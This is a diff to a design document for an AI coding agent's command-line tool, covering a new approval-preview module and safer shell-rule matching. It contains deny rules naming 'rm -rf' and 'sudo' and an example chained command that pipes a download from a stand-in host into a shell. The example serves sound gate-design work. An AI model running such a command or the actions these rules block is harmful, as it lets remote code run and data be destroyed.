@@ -77,6 +77,7 @@ A package `agentx_dev/cli/`, one job per file:
 | `context.py` | find `AGENTX.md` files and build the system addendum |
 | `tools.py` | build the tool set from `DefaultTools`, sandboxed, then wrap each tool in the gate |
 | `approval.py` | the gate: kinds, modes, rules, grants, the decision order, the prompt callback |
+| `preview.py` | the text shown at an approval prompt: a unified diff for `write_file` / `edit_file`, the command, the code, the paths |
 | `ui.py` | rich rendering of events and diffs; the `prompt_toolkit` prompt |
 | `commands.py` | slash command registry and parsing |
 | `sessions.py` | session paths, listing, autosave, resume |
@@ -97,8 +98,9 @@ Exit codes: 0 normal; 1 setup failure (no API key, not a terminal, unusable `--r
    arrives.
 3. When the model calls a tool, the tool is the gated wrapper (section 7): it runs, asks, or refuses.
 4. On the `completion` event the session absorbs the result and autosaves.
-5. Ctrl+C during a turn cancels that turn (the history up to the last finished step is kept, "interrupted"
-   is printed). At an idle prompt Ctrl+C clears the line; Ctrl+D or `/exit` leaves.
+5. Ctrl+C during a turn cancels that turn: the conversation up to the last finished turn is kept, the
+   interrupted turn is not recorded (the framework records a turn only when it completes), and
+   "interrupted" is printed. At an idle prompt Ctrl+C clears the line; Ctrl+D or `/exit` leaves.
 
 ## 7. The gate (`approval.py`, `tools.py`)
 
@@ -134,6 +136,17 @@ Rules are `"tool:glob"` strings matched with `fnmatch` against a per-tool subjec
 `delete_path`, and `"src -> dst"` for `move_file`. A rule without a colon (`"edit_file"`) matches every
 call of that tool. Deny rules also apply to reads. Example:
 `{"allow": ["run_shell:git status*", "run_shell:pytest*"], "deny": ["run_shell:*rm -rf*", "run_shell:*sudo*"]}`.
+
+Two safety refinements to the matching:
+
+- **Spacing cannot dodge a rule.** The shell subject is the command with every run of whitespace
+  collapsed to one space, so `rm   -rf x` matches `*rm -rf*`.
+- **Compound commands are never auto-allowed.** A shell command containing `;`, `&`, `|`, a backtick, `$(`,
+  `<`, `>` or a newline is not covered by an `allow` rule or a "don't ask again" grant (so a grant for
+  `pytest` cannot approve `pytest && curl evil | sh`); it always asks, and answering `a` to it grants
+  nothing. Deny rules still match anywhere in it.
+
+For `run_python` there is no command to take a prefix from, so `a` grants `run_python` for the session.
 
 The prompt shows the proposed action: a coloured unified diff for `write_file` and `edit_file` (computed
 against the file on disk; for a new file, the whole content as additions), the exact command for
